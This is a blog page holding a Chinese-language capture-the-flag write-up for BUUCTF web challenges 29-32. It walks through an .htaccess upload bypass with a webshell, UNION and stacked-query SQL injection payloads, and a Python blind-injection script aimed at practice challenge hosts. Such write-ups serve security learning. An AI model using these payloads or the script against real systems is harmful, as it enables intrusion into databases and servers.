@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Buuctf Web（29-32） | qinyiwen</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Buuctf Web（29-32）29、BabyUpload上传木马文件   抓包，把Content-Type改成image&#x2F;jpeg，send，上传成功  文件解析漏洞（.htaccess） 再上传一个文件.htaccess，用于把我们改成上传的1.png转换成php执行的文件 123456.htaccess是什么启用.htaccess，需要修改httpd.conf，启用AllowOv">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buuctf Web（29-32）">
+<meta property="og:url" content="http://example.com/2023/08/13/Buuctf%20Web%EF%BC%8829-32%EF%BC%89/index.html">
+<meta property="og:site_name" content="qinyiwen">
+<meta property="og:description" content="Buuctf Web（29-32）29、BabyUpload上传木马文件   抓包，把Content-Type改成image&#x2F;jpeg，send，上传成功  文件解析漏洞（.htaccess） 再上传一个文件.htaccess，用于把我们改成上传的1.png转换成php执行的文件 123456.htaccess是什么启用.htaccess，需要修改httpd.conf，启用AllowOv">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/f1cdf73f-54fb-4c8a-854e-4e53e534ca69">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/ecc9a7dc-9df4-4e7f-ba50-7e1968b6706d">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/7f2757c3-b6fb-4e0e-b663-7b9cc9b02b91">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/6be00b40-a2b8-49df-ba16-980b16e79a02">
+<meta property="og:image" content="c:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230815191917070.png">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/05eab8aa-52f7-4bb4-aebf-cbe359d4082c">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/e79aac52-8dab-4030-91ed-92bca059cc12">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/8197267a-a353-4dae-a72f-d1f94e8f7c37">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/c304cd3b-a35e-44a6-9f55-958580fc1518">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/2fa84c35-8f03-4b6b-87a3-3ce5671f25ea">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/11ef7be2-be51-4eb3-9f62-68be8e026f96">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/5344e371-2eae-4ebe-88d0-808aac8a6159">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/8767f15a-a1bf-4bce-90cf-c82d0aef5658">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/9b566e44-f2c4-4d8e-8530-0d37720d5c19">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/cb12cb04-56cd-415b-87cc-18d95c29ef60">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/88ea1742-4cf7-464c-8908-2e2ccf5a3806">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/95926219-75e6-4520-9328-ae5faac7a8e8">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/0de45253-1013-4318-af8f-e0f11fe1217f">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/a9be4a9b-169b-4e41-93f8-0914fac694f2">
+<meta property="og:image" content="c:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230815165542275.png">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/6b4ae33e-efd4-42ba-b3f2-11a4810f961a">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/d0f0968b-1747-4462-bb65-a5c23a4c7e37">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/9b6e604a-e507-4a25-991d-a01bf7e783ee">
+<meta property="article:published_time" content="2023-08-13T11:17:08.000Z">
+<meta property="article:modified_time" content="2023-08-15T11:38:03.804Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/f1cdf73f-54fb-4c8a-854e-4e53e534ca69">
+  
+    <link rel="alternate" href="/atom.xml" title="qinyiwen" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">qinyiwen</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Buuctf Web（29-32）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/08/13/Buuctf%20Web%EF%BC%8829-32%EF%BC%89/" class="article-date">
+  <time class="dt-published" datetime="2023-08-13T11:17:08.000Z" itemprop="datePublished">2023-08-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Buuctf Web（29-32）
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="Buuctf-Web（29-32）"><a href="#Buuctf-Web（29-32）" class="headerlink" title="Buuctf Web（29-32）"></a>Buuctf Web（29-32）</h3><h4 id="29、BabyUpload"><a href="#29、BabyUpload" class="headerlink" title="29、BabyUpload"></a>29、BabyUpload</h4><p>上传木马文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f1cdf73f-54fb-4c8a-854e-4e53e534ca69" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ecc9a7dc-9df4-4e7f-ba50-7e1968b6706d" alt="image"></p>
+<p>抓包，把Content-Type改成image&#x2F;jpeg，send，上传成功</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7f2757c3-b6fb-4e0e-b663-7b9cc9b02b91" alt="image"></p>
+<p>文件解析漏洞（.htaccess）</p>
+<p>再上传一个文件.htaccess，用于把我们改成上传的1.png转换成php执行的文件</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.htaccess是什么</span><br><span class="line">启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</span><br><span class="line"></span><br><span class="line">笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</span><br><span class="line"></span><br><span class="line">来源网站：https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6be00b40-a2b8-49df-ba16-980b16e79a02" alt="image"></p>
+<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230815191917070.png" alt="image-20230815191917070"></p>
+<p>剑蚁连接</p>
+<p>url：<code>http://954cf8be-bbf5-4eae-b98c-8ec3134ab480.node4.buuoj.cn:81/upload/eb1fdce4f69ef7dbee3449f34d370e48/1.png</code></p>
+<p>密码：<code>zyh</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/05eab8aa-52f7-4bb4-aebf-cbe359d4082c" alt="image"></p>
+<p>测试连接，连接成功，添加</p>
+<p>右键单击，文件管理，可以看见刚刚上传的两个文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e79aac52-8dab-4030-91ed-92bca059cc12" alt="image"></p>
+<p>到根目录可以看到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8197267a-a353-4dae-a72f-d1f94e8f7c37" alt="image"></p>
+<p>双击得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c304cd3b-a35e-44a6-9f55-958580fc1518" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;311e55a5-2d17-4918-bc47-3bd56396cb65&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="30、BabySQli"><a href="#30、BabySQli" class="headerlink" title="30、BabySQli"></a>30、BabySQli</h4><p>随便输入，然后登录</p>
+<p>跳转到了search.php</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2fa84c35-8f03-4b6b-87a3-3ce5671f25ea" alt="image"></p>
+<p>查看源代码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/11ef7be2-be51-4eb3-9f62-68be8e026f96" alt="image"></p>
+<p>第一行有一串加密的字符，base32+base64解密</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5344e371-2eae-4ebe-88d0-808aac8a6159" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8767f15a-a1bf-4bce-90cf-c82d0aef5658" alt="image"></p>
+<p>得到：select * from user where username &#x3D; ‘$name’</p>
+<p>存在一个admin用户，当name&#x3D;admin时回显不是user error而是pass error</p>
+<p>这里的验证方式是将name带入查询再将查询后的密码与输入进行比对。经过常规注入手段我们发现这里有三个字段</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9b566e44-f2c4-4d8e-8530-0d37720d5c19" alt="image"></p>
+<p>爆字段数：<code>name=admin&#39; Order by 3 #&amp;pw=1</code>——注意：这里的or被过滤，使用大小写绕过</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/cb12cb04-56cd-415b-87cc-18d95c29ef60" alt="image"></p>
+<p>经测试admin在第二字段</p>
+<p>union联合查询在查询不存在的数据时，会创建一个临时数据，然后返回这个临时数据union select 1,2,3，返回数据就为column1：1，column2：2，column3：3。我们可以根据这个特性来猜测user字段的位置。经过猜测我们发现admin在2的位置。</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/88ea1742-4cf7-464c-8908-2e2ccf5a3806" alt="image"></p>
+<p>猜测3的位置应该就是pass字段并且这里pass应该存储的是MD5值，将123进行MD5加密放到3的位置，这时union select, 1,admin,‘md5(123)’,的返回数据为column1：1，column2：admin，column3：md5(123),并且将返回的md5(123)，与我们输入的pass的md5值进行比对如果一样则会登陆成功。</p>
+<p>payload：<code>name=1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39; #&amp;pw=123</code></p>
+<p>得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/95926219-75e6-4520-9328-ae5faac7a8e8" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ee2e0a88-2e24-42a8-aca4-82df10b46a95&#125; </span><br></pre></td></tr></table></figure>
+
+<h4 id="31、Blacklist"><a href="#31、Blacklist" class="headerlink" title="31、Blacklist"></a>31、Blacklist</h4><p><strong>堆叠注入+HANDLER</strong></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0de45253-1013-4318-af8f-e0f11fe1217f" alt="image"></p>
+<p><code>1&#39;;show databases;#</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/a9be4a9b-169b-4e41-93f8-0914fac694f2" alt="image"></p>
+<p><code>1&#39;;show tables;#</code></p>
+<p>看到了FlagHere</p>
+<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230815165542275.png" alt="image-20230815165542275"></p>
+<p><code>1&#39;; show columns from FlagHere;#</code></p>
+<p>看到了flag字段</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6b4ae33e-efd4-42ba-b3f2-11a4810f961a" alt="image"></p>
+<p>大佬的方法</p>
+<p>HANDLER OPEN语句打开一个表，使其可以使用后续HANDLER READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER CLOSE或会话终止之前不会关闭</p>
+<p><code>1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d0f0968b-1747-4462-bb65-a5c23a4c7e37" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a23e0fdb-6350-412e-9f51-b021e9d5956e&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="32、Hack-World"><a href="#32、Hack-World" class="headerlink" title="32、Hack World"></a>32、Hack World</h4><p>显示了一些常见的SQL字符，很多都被过滤了</p>
+<p>但还有<code>()</code>字符没被过滤，我们使用<code>()</code>代替空格，而且题目提示flag在flag表的flag字段中</p>
+<p>使用脚本爆破</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># Author: mochu7</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def blind_injection(url):</span><br><span class="line">	flag = &#x27;&#x27;</span><br><span class="line">	strings = string.printable</span><br><span class="line">	for num in range(1,60):</span><br><span class="line">		for i in strings:</span><br><span class="line">			payload = &#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;.format(num,ord(i))#format函数设置指定位置&#123;0&#125;&#123;1&#125;</span><br><span class="line">			post_data = &#123;&quot;id&quot;:payload&#125;</span><br><span class="line">			res = requests.post(url=url,data=post_data)</span><br><span class="line">			if &#x27;Hello&#x27; in res.text:</span><br><span class="line">				flag += i</span><br><span class="line">				print(str(num)+&#x27;:&#x27;+flag)</span><br><span class="line">			else:</span><br><span class="line">				continue</span><br><span class="line">	print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	url = &#x27;http://f3973461-b610-4d3c-aebe-b5c7fba25e38.node4.buuoj.cn:81/index.php&#x27;</span><br><span class="line">	blind_injection(url)</span><br></pre></td></tr></table></figure>
+
+<p>运行得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9b6e604a-e507-4a25-991d-a01bf7e783ee" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fbc1a128-737d-4d89-9b9d-fad374bbef13&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/13/Buuctf%20Web%EF%BC%8829-32%EF%BC%89/" data-id="cllcagtdl0001nkvfe1u11sdt" data-title="Buuctf Web（29-32）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/08/14/Buuctf%20Misc%EF%BC%882-5%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Buuctf Misc（2-5）
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Buuctf Web（25-28）</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 20px;">Fuzzing</a> <a href="/tags/learn/" style="font-size: 10px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 15px;">论文细读</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/08/14/Buuctf%20Misc%EF%BC%882-5%EF%BC%89/">Buuctf Misc（2-5）</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/13/Buuctf%20Web%EF%BC%8829-32%EF%BC%89/">Buuctf Web（29-32）</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/">Buuctf Web（25-28）</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/">Buuctf Web（21-24）</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/10/Buuctf%20Web%EF%BC%8817-20%EF%BC%89/">Buuctf Web（17-20）</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
